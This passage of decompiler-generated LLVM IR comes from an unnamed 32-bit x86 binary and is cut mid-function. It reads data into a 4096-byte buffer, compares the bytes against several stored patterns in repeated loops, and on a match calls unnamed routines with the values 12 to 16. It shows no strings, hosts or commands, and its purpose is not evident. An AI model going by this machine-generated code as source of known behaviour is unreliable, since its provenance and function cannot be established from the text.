  %v1_804e18c = phi i32 [ %v1_804e189, %dec_label_pc_804e0e6 ], [ %v0_804e297, %dec_label_pc_804e297 ], [ %v0_804e297, %dec_label_pc_804e2a0.backedge ], [ %v0_804e297, %dec_label_pc_804e288 ]
  %v0_804e18c = phi i32 [ %v0_804e18c.pre, %dec_label_pc_804e0e6 ], [ %v0_804e18c52, %dec_label_pc_804e297 ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ], [ %v0_804e18c52, %dec_label_pc_804e288 ]
  %v2_804e18c = add i32 %v1_804e18c, -4
  %v3_804e18c = inttoptr i32 %v2_804e18c to i32*
  store i32 %v0_804e18c, i32* %v3_804e18c, align 4
  %v1_804e18d = add i32 %v1_804e18c, -8
  %v2_804e18d = inttoptr i32 %v1_804e18d to i32*
  store i32 4096, i32* %v2_804e18d, align 4
  %v1_804e192 = add i32 %v1_804e18c, 56
  store i32 %v1_804e192, i32* %eax.global-to-local, align 4
  %v2_804e196 = add i32 %v1_804e18c, -12
  %v3_804e196 = inttoptr i32 %v2_804e196 to i32*
  store i32 %v1_804e192, i32* %v3_804e196, align 4
  %v1_804e197 = add i32 %v1_804e18c, 40
  %v2_804e197 = inttoptr i32 %v1_804e197 to i32*
  %v3_804e197 = load i32, i32* %v2_804e197, align 4
  store i32 %v3_804e197, i32* %eax.global-to-local, align 4
  %v2_804e19b = add i32 %v1_804e18c, -16
  %v3_804e19b = inttoptr i32 %v2_804e19b to i32*
  store i32 %v3_804e197, i32* %v3_804e19b, align 4
  %v5_804e19c = call i32 @function_80523dc(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e19c, i32* %eax.global-to-local, align 4
  %v0_804e1a1 = load i32, i32* @esp, align 4
  store i32 %v5_804e19c, i32* @ebx, align 4
  %tmp114 = icmp slt i32 %v5_804e19c, 1
  br i1 %tmp114, label %dec_label_pc_804e397, label %dec_label_pc_804e1ae

dec_label_pc_804e1ae:                             ; preds = %dec_label_pc_804e18c
  %v1_804e1a1 = add i32 %v0_804e1a1, 16
  %v1_804e1ae = add i32 %v0_804e1a1, 8436
  %v2_804e1ae = inttoptr i32 %v1_804e1ae to i32*
  %v3_804e1ae = load i32, i32* %v2_804e1ae, align 4
  store i32 %v3_804e1ae, i32* %eax.global-to-local, align 4
  %v2_804e1b5 = inttoptr i32 %v1_804e1a1 to i32*
  store i32 %v3_804e1ae, i32* %v2_804e1b5, align 4
  %v0_804e1b8 = load i32, i32* @ebx, align 4
  %v1_804e1b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1b8 = sub i32 %v0_804e1b8, %v1_804e1b8
  %v8_804e1b8 = xor i32 %v1_804e1b8, %v0_804e1b8
  %v9_804e1b8 = xor i32 %v2_804e1b8, %v0_804e1b8
  %v10_804e1b8 = and i32 %v9_804e1b8, %v8_804e1b8
  %v11_804e1b8 = icmp slt i32 %v10_804e1b8, 0
  %v13_804e1b8 = icmp slt i32 %v2_804e1b8, 0
  %v2_804e1ba = icmp eq i1 %v13_804e1b8, %v11_804e1b8
  br i1 %v2_804e1ba, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge

dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge: ; preds = %dec_label_pc_804e1ae
  %v0_804e1e8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1ae
  %v0_804e1c1 = load i32, i32* @esp, align 4
  %v10_804e1c5 = icmp eq i32 %v0_804e1b8, 0
  br i1 %v10_804e1c5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d0.preheader

dec_label_pc_804e1d0.preheader:                   ; preds = %dec_label_pc_804e1bc
  %v1_804e1c1 = add i32 %v0_804e1c1, 56
  %v1_804e1d0 = add i32 %v0_804e1c1, 36
  %v2_804e1d0 = inttoptr i32 %v1_804e1d0 to i32*
  %v1_804e2c1 = inttoptr i32 %v0_804e1c1 to i32*
  br label %dec_label_pc_804e1d0

dec_label_pc_804e1d0:                             ; preds = %dec_label_pc_804e1d0.preheader, %dec_label_pc_804e1e1
  %v0_804e1e1.in = phi i32 [ %v0_804e1e1, %dec_label_pc_804e1e1 ], [ %v0_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e2c0 = phi i32 [ %v3_804e1d661, %dec_label_pc_804e1e1 ], [ 0, %dec_label_pc_804e1d0.preheader ]
  %v4_804e1d4 = phi i32 [ %v6_804e1d4, %dec_label_pc_804e1e1 ], [ %v1_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e2 = phi i32 [ %v1_804e1e2, %dec_label_pc_804e1e1 ], [ %v1_804e1c1, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e1 = add i32 %v0_804e1e1.in, -1
  %v3_804e1d0 = load i32, i32* %v2_804e1d0, align 4
  store i32 %v3_804e1d0, i32* @edi, align 4
  %v1_804e1d4 = inttoptr i32 %v0_804e1e2 to i8*
  %v2_804e1d4 = load i8, i8* %v1_804e1d4, align 1
  %v3_804e1d4 = zext i8 %v2_804e1d4 to i32
  %v5_804e1d4 = and i32 %v4_804e1d4, -256
  %v6_804e1d4 = or i32 %v3_804e1d4, %v5_804e1d4
  store i32 %v6_804e1d4, i32* %eax.global-to-local, align 4
  %v4_804e1d6 = add i32 %v3_804e1d0, %v0_804e2c0
  %v5_804e1d6 = inttoptr i32 %v4_804e1d6 to i8*
  %v6_804e1d6 = load i8, i8* %v5_804e1d6, align 1
  %v17_804e1d6 = icmp eq i8 %v2_804e1d4, %v6_804e1d6
  br i1 %v17_804e1d6, label %dec_label_pc_804e2c0, label %dec_label_pc_804e1df

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1d0
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e1df
  %v3_804e1d661 = phi i32 [ %v1_804e2c0, %dec_label_pc_804e2c0 ], [ 0, %dec_label_pc_804e1df ]
  %v1_804e1e2 = add i32 %v0_804e1e2, 1
  %v10_804e1e3 = icmp eq i32 %v0_804e1e1, 0
  %v1_804e1e6 = icmp eq i1 %v10_804e1e3, false
  br i1 %v1_804e1e6, label %dec_label_pc_804e1d0, label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1e1, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge, %dec_label_pc_804e1bc
  %v0_804e1e8 = phi i32 [ %v0_804e1e8.pre, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge ], [ %v0_804e1c1, %dec_label_pc_804e1bc ], [ %v0_804e1c1, %dec_label_pc_804e1e1 ]
  %v1_804e1e8 = add i32 %v0_804e1e8, 8416
  %v2_804e1e8 = inttoptr i32 %v1_804e1e8 to i32*
  %v3_804e1e8 = load i32, i32* %v2_804e1e8, align 4
  store i32 %v3_804e1e8, i32* %eax.global-to-local, align 4
  %v2_804e1ef = inttoptr i32 %v0_804e1e8 to i32*
  store i32 %v3_804e1e8, i32* %v2_804e1ef, align 4
  %v0_804e1f2 = load i32, i32* @ebx, align 4
  %v1_804e1f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1f2 = sub i32 %v0_804e1f2, %v1_804e1f2
  %v8_804e1f2 = xor i32 %v1_804e1f2, %v0_804e1f2
  %v9_804e1f2 = xor i32 %v2_804e1f2, %v0_804e1f2
  %v10_804e1f2 = and i32 %v9_804e1f2, %v8_804e1f2
  %v11_804e1f2 = icmp slt i32 %v10_804e1f2, 0
  %v13_804e1f2 = icmp slt i32 %v2_804e1f2, 0
  %v2_804e1f4 = icmp eq i1 %v13_804e1f2, %v11_804e1f2
  br i1 %v2_804e1f4, label %dec_label_pc_804e1f6, label %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge

dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge: ; preds = %dec_label_pc_804e1e8
  %v0_804e21c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e21c

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1e8
  %v0_804e1fb = load i32, i32* @esp, align 4
  %v10_804e1ff = icmp eq i32 %v0_804e1f2, 0
  br i1 %v10_804e1ff, label %dec_label_pc_804e21c, label %dec_label_pc_804e204.preheader

dec_label_pc_804e204.preheader:                   ; preds = %dec_label_pc_804e1f6
  %v1_804e1fb = add i32 %v0_804e1fb, 56
  %v1_804e204 = add i32 %v0_804e1fb, 32
  %v2_804e204 = inttoptr i32 %v1_804e204 to i32*
  %v1_804e359 = inttoptr i32 %v0_804e1fb to i32*
  br label %dec_label_pc_804e204

dec_label_pc_804e204:                             ; preds = %dec_label_pc_804e204.preheader, %dec_label_pc_804e216
  %v0_804e216.in = phi i32 [ %v0_804e216, %dec_label_pc_804e216 ], [ %v0_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e358 = phi i32 [ %v3_804e20a69, %dec_label_pc_804e216 ], [ 0, %dec_label_pc_804e204.preheader ]
  %v4_804e208 = phi i32 [ %v6_804e208, %dec_label_pc_804e216 ], [ %v1_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e362 = phi i32 [ %v1_804e215, %dec_label_pc_804e216 ], [ %v1_804e1fb, %dec_label_pc_804e204.preheader ]
  %v0_804e216 = add i32 %v0_804e216.in, -1
  %v3_804e204 = load i32, i32* %v2_804e204, align 4
  store i32 %v3_804e204, i32* @edi, align 4
  %v1_804e208 = inttoptr i32 %v0_804e362 to i8*
  %v2_804e208 = load i8, i8* %v1_804e208, align 1
  %v3_804e208 = zext i8 %v2_804e208 to i32
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  store i32 %v6_804e208, i32* %eax.global-to-local, align 4
  %v4_804e20a = add i32 %v3_804e204, %v0_804e358
  %v5_804e20a = inttoptr i32 %v4_804e20a to i8*
  %v6_804e20a = load i8, i8* %v5_804e20a, align 1
  %v17_804e20a = icmp eq i8 %v2_804e208, %v6_804e20a
  br i1 %v17_804e20a, label %dec_label_pc_804e358, label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %dec_label_pc_804e204
  br label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e213
  %v3_804e20a69 = phi i32 [ 0, %dec_label_pc_804e213 ], [ %v1_804e358, %dec_label_pc_804e358 ]
  %v1_804e215 = add i32 %v0_804e362, 1
  %v10_804e217 = icmp eq i32 %v0_804e216, 0
  %v1_804e21a = icmp eq i1 %v10_804e217, false
  br i1 %v1_804e21a, label %dec_label_pc_804e204, label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge, %dec_label_pc_804e1f6
  %v0_804e21c = phi i32 [ %v0_804e21c.pre, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge ], [ %v0_804e1fb, %dec_label_pc_804e1f6 ], [ %v0_804e1fb, %dec_label_pc_804e216 ]
  %v1_804e21c = add i32 %v0_804e21c, 8412
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  %v3_804e21c = load i32, i32* %v2_804e21c, align 4
  store i32 %v3_804e21c, i32* %eax.global-to-local, align 4
  %v2_804e223 = inttoptr i32 %v0_804e21c to i32*
  store i32 %v3_804e21c, i32* %v2_804e223, align 4
  %v0_804e226 = load i32, i32* @ebx, align 4
  %v1_804e226 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e226 = sub i32 %v0_804e226, %v1_804e226
  %v8_804e226 = xor i32 %v1_804e226, %v0_804e226
  %v9_804e226 = xor i32 %v2_804e226, %v0_804e226
  %v10_804e226 = and i32 %v9_804e226, %v8_804e226
  %v11_804e226 = icmp slt i32 %v10_804e226, 0
  %v13_804e226 = icmp slt i32 %v2_804e226, 0
  %v2_804e228 = icmp eq i1 %v13_804e226, %v11_804e226
  br i1 %v2_804e228, label %dec_label_pc_804e22a, label %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge

dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge: ; preds = %dec_label_pc_804e21c
  %v0_804e250.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e250

dec_label_pc_804e22a:                             ; preds = %dec_label_pc_804e21c
  %v0_804e22f = load i32, i32* @esp, align 4
  %v10_804e233 = icmp eq i32 %v0_804e226, 0
  br i1 %v10_804e233, label %dec_label_pc_804e250, label %dec_label_pc_804e238.preheader

dec_label_pc_804e238.preheader:                   ; preds = %dec_label_pc_804e22a
  %v1_804e22f = add i32 %v0_804e22f, 56
  %v1_804e238 = add i32 %v0_804e22f, 28
  %v2_804e238 = inttoptr i32 %v1_804e238 to i32*
  %v1_804e369 = inttoptr i32 %v0_804e22f to i32*
  br label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e238.preheader, %dec_label_pc_804e24a
  %v0_804e24a.in = phi i32 [ %v0_804e24a, %dec_label_pc_804e24a ], [ %v0_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e368 = phi i32 [ %v3_804e23e77, %dec_label_pc_804e24a ], [ 0, %dec_label_pc_804e238.preheader ]
  %v4_804e23c = phi i32 [ %v6_804e23c, %dec_label_pc_804e24a ], [ %v1_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e372 = phi i32 [ %v1_804e249, %dec_label_pc_804e24a ], [ %v1_804e22f, %dec_label_pc_804e238.preheader ]
  %v0_804e24a = add i32 %v0_804e24a.in, -1
  %v3_804e238 = load i32, i32* %v2_804e238, align 4
  store i32 %v3_804e238, i32* @edi, align 4
  %v1_804e23c = inttoptr i32 %v0_804e372 to i8*
  %v2_804e23c = load i8, i8* %v1_804e23c, align 1
  %v3_804e23c = zext i8 %v2_804e23c to i32
  %v5_804e23c = and i32 %v4_804e23c, -256
  %v6_804e23c = or i32 %v3_804e23c, %v5_804e23c
  store i32 %v6_804e23c, i32* %eax.global-to-local, align 4
  %v4_804e23e = add i32 %v3_804e238, %v0_804e368
  %v5_804e23e = inttoptr i32 %v4_804e23e to i8*
  %v6_804e23e = load i8, i8* %v5_804e23e, align 1
  %v17_804e23e = icmp eq i8 %v2_804e23c, %v6_804e23e
  br i1 %v17_804e23e, label %dec_label_pc_804e368, label %dec_label_pc_804e247

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e238
  br label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e368, %dec_label_pc_804e247
  %v3_804e23e77 = phi i32 [ 0, %dec_label_pc_804e247 ], [ %v1_804e368, %dec_label_pc_804e368 ]
  %v1_804e249 = add i32 %v0_804e372, 1
  %v10_804e24b = icmp eq i32 %v0_804e24a, 0
  %v1_804e24e = icmp eq i1 %v10_804e24b, false
  br i1 %v1_804e24e, label %dec_label_pc_804e238, label %dec_label_pc_804e250

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e24a, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge, %dec_label_pc_804e22a
  %v0_804e250 = phi i32 [ %v0_804e250.pre, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge ], [ %v0_804e22f, %dec_label_pc_804e22a ], [ %v0_804e22f, %dec_label_pc_804e24a ]
  %v1_804e250 = add i32 %v0_804e250, 8424
  %v2_804e250 = inttoptr i32 %v1_804e250 to i32*
  %v3_804e250 = load i32, i32* %v2_804e250, align 4
  store i32 %v3_804e250, i32* %eax.global-to-local, align 4
  %v2_804e257 = inttoptr i32 %v0_804e250 to i32*
  store i32 %v3_804e250, i32* %v2_804e257, align 4
  %v0_804e25a = load i32, i32* @ebx, align 4
  %v1_804e25a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e25a = sub i32 %v0_804e25a, %v1_804e25a
  %v8_804e25a = xor i32 %v1_804e25a, %v0_804e25a
  %v9_804e25a = xor i32 %v2_804e25a, %v0_804e25a
  %v10_804e25a = and i32 %v9_804e25a, %v8_804e25a
  %v11_804e25a = icmp slt i32 %v10_804e25a, 0
  %v13_804e25a = icmp slt i32 %v2_804e25a, 0
  %v2_804e25c = icmp eq i1 %v13_804e25a, %v11_804e25a
  br i1 %v2_804e25c, label %dec_label_pc_804e25e, label %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge

dec_label_pc_804e250.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e250
  %v0_804e288.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e25e:                             ; preds = %dec_label_pc_804e250
  %v0_804e263 = load i32, i32* @esp, align 4
  %v10_804e267 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e267, label %dec_label_pc_804e288, label %dec_label_pc_804e270.preheader

dec_label_pc_804e270.preheader:                   ; preds = %dec_label_pc_804e25e
  %v1_804e263 = add i32 %v0_804e263, 56
  %v1_804e270 = add i32 %v0_804e263, 24
  %v2_804e270 = inttoptr i32 %v1_804e270 to i32*
  %v1_804e379 = inttoptr i32 %v0_804e263 to i32*
  br label %dec_label_pc_804e270

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e270.preheader, %dec_label_pc_804e282
  %v0_804e282.in = phi i32 [ %v0_804e282, %dec_label_pc_804e282 ], [ %v0_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e378 = phi i32 [ %v3_804e27685, %dec_label_pc_804e282 ], [ 0, %dec_label_pc_804e270.preheader ]
  %v4_804e274 = phi i32 [ %v6_804e274, %dec_label_pc_804e282 ], [ %v1_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e382 = phi i32 [ %v1_804e281, %dec_label_pc_804e282 ], [ %v1_804e263, %dec_label_pc_804e270.preheader ]
  %v0_804e282 = add i32 %v0_804e282.in, -1
  %v3_804e270 = load i32, i32* %v2_804e270, align 4
  store i32 %v3_804e270, i32* @edi, align 4
  %v1_804e274 = inttoptr i32 %v0_804e382 to i8*
  %v2_804e274 = load i8, i8* %v1_804e274, align 1
  %v3_804e274 = zext i8 %v2_804e274 to i32
  %v5_804e274 = and i32 %v4_804e274, -256
  %v6_804e274 = or i32 %v3_804e274, %v5_804e274
  store i32 %v6_804e274, i32* %eax.global-to-local, align 4
  %v4_804e276 = add i32 %v3_804e270, %v0_804e378
  %v5_804e276 = inttoptr i32 %v4_804e276 to i8*
  %v6_804e276 = load i8, i8* %v5_804e276, align 1
  %v17_804e276 = icmp eq i8 %v2_804e274, %v6_804e276
  br i1 %v17_804e276, label %dec_label_pc_804e378, label %dec_label_pc_804e27f

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e270
  br label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e378, %dec_label_pc_804e27f
  %v3_804e27685 = phi i32 [ 0, %dec_label_pc_804e27f ], [ %v1_804e378, %dec_label_pc_804e378 ]
  %v1_804e281 = add i32 %v0_804e382, 1
  %v10_804e283 = icmp eq i32 %v0_804e282, 0
  %v1_804e286 = icmp eq i1 %v10_804e283, false
  br i1 %v1_804e286, label %dec_label_pc_804e270, label %dec_label_pc_804e288

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e282, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge, %dec_label_pc_804e25e
  %v0_804e297 = phi i32 [ %v0_804e288.pre, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v0_804e263, %dec_label_pc_804e25e ], [ %v0_804e263, %dec_label_pc_804e282 ]
  %v0_804e18c52 = phi i32 [ %v1_804e25a, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v1_804e25a, %dec_label_pc_804e25e ], [ %v6_804e274, %dec_label_pc_804e282 ]
  %v1_804e288 = add i32 %v0_804e297, 8408
  %v2_804e288 = inttoptr i32 %v1_804e288 to i32*
  %v3_804e288 = load i32, i32* %v2_804e288, align 4
  %v2_804e28f = sub i32 %v0_804e25a, %v3_804e288
  %v8_804e28f = xor i32 %v3_804e288, %v0_804e25a
  %v9_804e28f = xor i32 %v2_804e28f, %v0_804e25a
  %v10_804e28f = and i32 %v9_804e28f, %v8_804e28f
  %v11_804e28f = icmp slt i32 %v10_804e28f, 0
  %v13_804e28f = icmp slt i32 %v2_804e28f, 0
  %v2_804e291 = icmp eq i1 %v13_804e28f, %v11_804e28f
  br i1 %v2_804e291, label %dec_label_pc_804e297, label %dec_label_pc_804e18c

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e288
  %v1_804e2a0126 = add i32 %v0_804e25a, -1
  store i32 %v1_804e2a0126, i32* @ebx, align 4
  %v10_804e2a1127 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e2a1127, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa.lr.ph

dec_label_pc_804e2aa.lr.ph:                       ; preds = %dec_label_pc_804e297
  %v1_804e297 = add i32 %v0_804e297, 56
  %v1_804e2aa = add i32 %v0_804e297, 20
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  br label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2aa.lr.ph, %dec_label_pc_804e2a0.backedge
  %v1_804e2a0131 = phi i32 [ %v1_804e2a0126, %dec_label_pc_804e2aa.lr.ph ], [ %v1_804e2a0, %dec_label_pc_804e2a0.backedge ]
  %v4_804e2ae130 = phi i32 [ %v0_804e18c52, %dec_label_pc_804e2aa.lr.ph ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ]
  %v0_804e391129 = phi i32 [ %v1_804e297, %dec_label_pc_804e2aa.lr.ph ], [ %storemerge32.in, %dec_label_pc_804e2a0.backedge ]
  %v0_804e388128 = phi i32 [ 0, %dec_label_pc_804e2aa.lr.ph ], [ %v3_804e2b091, %dec_label_pc_804e2a0.backedge ]
  %v3_804e2aa = load i32, i32* %v2_804e2aa, align 4
  store i32 %v3_804e2aa, i32* @edi, align 4
  %v1_804e2ae = inttoptr i32 %v0_804e391129 to i8*
  %v2_804e2ae = load i8, i8* %v1_804e2ae, align 1
  %v3_804e2ae = zext i8 %v2_804e2ae to i32
  %v5_804e2ae = and i32 %v4_804e2ae130, -256
  %v6_804e2ae = or i32 %v3_804e2ae, %v5_804e2ae
  store i32 %v6_804e2ae, i32* %eax.global-to-local, align 4
  %v4_804e2b0 = add i32 %v3_804e2aa, %v0_804e388128
  %v5_804e2b0 = inttoptr i32 %v4_804e2b0 to i8*
  %v6_804e2b0 = load i8, i8* %v5_804e2b0, align 1
  %v17_804e2b0 = icmp eq i8 %v2_804e2ae, %v6_804e2b0
  br i1 %v17_804e2b0, label %dec_label_pc_804e388, label %dec_label_pc_804e2b9

dec_label_pc_804e2b9:                             ; preds = %dec_label_pc_804e2aa
  br label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e1d0
  %v1_804e2c0 = add i32 %v0_804e2c0, 1
  %v2_804e2c1 = load i32, i32* %v1_804e2c1, align 4
  %v14_804e2c1 = icmp eq i32 %v2_804e2c1, %v1_804e2c0
  %v1_804e2c4 = icmp eq i1 %v14_804e2c1, false
  br i1 %v1_804e2c4, label %dec_label_pc_804e1e1, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e358, %dec_label_pc_804e368, %dec_label_pc_804e378, %dec_label_pc_804e388
  %v0_804e2ca = phi i32 [ %v0_804e297, %dec_label_pc_804e388 ], [ %v0_804e263, %dec_label_pc_804e378 ], [ %v0_804e22f, %dec_label_pc_804e368 ], [ %v0_804e1fb, %dec_label_pc_804e358 ], [ %v0_804e1c1, %dec_label_pc_804e2c0 ]
  %v1_804e2cd = add i32 %v0_804e2ca, -16
  %v2_804e2cd = inttoptr i32 %v1_804e2cd to i32*
  store i32 12, i32* %v2_804e2cd, align 4
  %v2_804e2cf = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @esp, align 4
  %v1_804e2d4 = inttoptr i32 %v0_804e2d4 to i32*
  store i32 13, i32* %v1_804e2d4, align 4
  %v2_804e2db = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  %v0_804e2e0 = load i32, i32* @esp, align 4
  %v1_804e2e0 = inttoptr i32 %v0_804e2e0 to i32*
  store i32 14, i32* %v1_804e2e0, align 4
  %v2_804e2e7 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e2e7, i32* %eax.global-to-local, align 4
  %v0_804e2ec = load i32, i32* @esp, align 4
  %v1_804e2ec = inttoptr i32 %v0_804e2ec to i32*
  store i32 15, i32* %v1_804e2ec, align 4
  %v2_804e2f3 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e2f3, i32* %eax.global-to-local, align 4
  %v0_804e2f8 = load i32, i32* @esp, align 4
  %v1_804e2f8 = inttoptr i32 %v0_804e2f8 to i32*
  store i32 16, i32* %v1_804e2f8, align 4
  %v2_804e2ff = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e2ff, i32* %eax.global-to-local, align 4
  %v0_804e304 = load i32, i32* @esp, align 4
  %v1_804e304 = inttoptr i32 %v0_804e304 to i32*
  %v2_804e304 = load i32, i32* %v1_804e304, align 4
  store i32 %v2_804e304, i32* %eax.global-to-local, align 4
  %v1_804e305 = add i32 %v0_804e304, 56
  %v2_804e305 = inttoptr i32 %v1_804e305 to i32*
  %v3_804e305 = load i32, i32* %v2_804e305, align 4
  store i32 %v3_804e305, i32* @edi, align 4
  store i32 %v3_804e305, i32* %v1_804e304, align 4
  %v1_804e30a = call i32 @function_8052241(i32 0)
  store i32 %v1_804e30a, i32* %eax.global-to-local, align 4
  %v0_804e30f = load i32, i32* @esp, align 4
  %v1_804e30f = inttoptr i32 %v0_804e30f to i32*
  %v2_804e30f = load i32, i32* %v1_804e30f, align 4
  store i32 %v2_804e30f, i32* @ebx, align 4
  %v3_804e30f = add i32 %v0_804e30f, 4
  %v1_804e310 = inttoptr i32 %v3_804e30f to i32*
  store i32 9, i32* %v1_804e310, align 4
  %v0_804e313 = load i32, i32* @ebp, align 4
  store i32 %v0_804e313, i32* %v1_804e30f, align 4
  %v4_804e314 = call i32 @function_8052320(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e314, i32* @eax, align 4
  %v0_804e319 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e0c7, %dec_label_pc_804e397, %dec_label_pc_804e2ca
  %v1_804e31c.in = phi i32 [ %v0_804e0dc, %dec_label_pc_804e0c7 ], [ %v0_804e3dc, %dec_label_pc_804e397 ], [ %v0_804e319, %dec_label_pc_804e2ca ]
  %v0_804e31c = load i32, i32* @ecx, align 4
  %v2_804e31c = add i32 %v1_804e31c.in, 12
  %v3_804e31c = inttoptr i32 %v2_804e31c to i32*
  store i32 %v0_804e31c, i32* %v3_804e31c, align 4
  %v0_804e31d = load i32, i32* @ecx, align 4
  %v2_804e31d = add i32 %v1_804e31c.in, 8
  %v3_804e31d = inttoptr i32 %v2_804e31d to i32*
  store i32 %v0_804e31d, i32* %v3_804e31d, align 4
  %v1_804e31e = add i32 %v1_804e31c.in, 4
  %v2_804e31e = inttoptr i32 %v1_804e31e to i32*
  store i32 64, i32* %v2_804e31e, align 4
  %v0_804e320 = load i32, i32* @ebp, align 4
  store i32 %v0_804e320, i32* @esi, align 4
  %v1_804e322 = add i32 %v1_804e31c.in, 8328
  store i32 %v1_804e322, i32* @edi, align 4
  %v3_804e329 = inttoptr i32 %v1_804e31c.in to i32*
  store i32 %v1_804e322, i32* %v3_804e329, align 4
  %v2_804e32a = call i32 @function_8051d30(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e32a, i32* %eax.global-to-local, align 4
  %v0_804e32f = load i32, i32* @esp, align 4
  %v1_804e32f = inttoptr i32 %v0_804e32f to i32*
  %v2_804e32f = load i32, i32* %v1_804e32f, align 4
  store i32 %v2_804e32f, i32* %eax.global-to-local, align 4
  %v3_804e32f = add i32 %v0_804e32f, 4
  %v1_804e330 = inttoptr i32 %v3_804e32f to i32*
  store i32 64, i32* %v1_804e330, align 4
  %v1_804e333 = add i32 %v0_804e32f, 8264
  store i32 %v1_804e333, i32* @eax, align 4
  store i32 %v1_804e333, i32* %v1_804e32f, align 4
  %v2_804e33b = call i32 @function_8051d30(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e33b, i32* %eax.global-to-local, align 4
  %v0_804e340 = load i32, i32* @esp, align 4
  %v1_804e340 = inttoptr i32 %v0_804e340 to i32*
  store i32 1, i32* %v1_804e340, align 4
  %v1_804e347 = call i32 @function_8053df0(i32 0)
  store i32 %v1_804e347, i32* %eax.global-to-local, align 4
  %v0_804e34c = load i32, i32* @esp, align 4
  %v1_804e34c = add i32 %v0_804e34c, 24
  %v2_804e34c = inttoptr i32 %v1_804e34c to i32*
  %v3_804e34c = load i32, i32* %v2_804e34c, align 4
  store i32 %v3_804e34c, i32* @ebx, align 4
  %v1_804e350 = add i32 %v0_804e34c, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e204
  %v1_804e358 = add i32 %v0_804e358, 1
  %v2_804e359 = load i32, i32* %v1_804e359, align 4
  %v14_804e359 = icmp eq i32 %v2_804e359, %v1_804e358
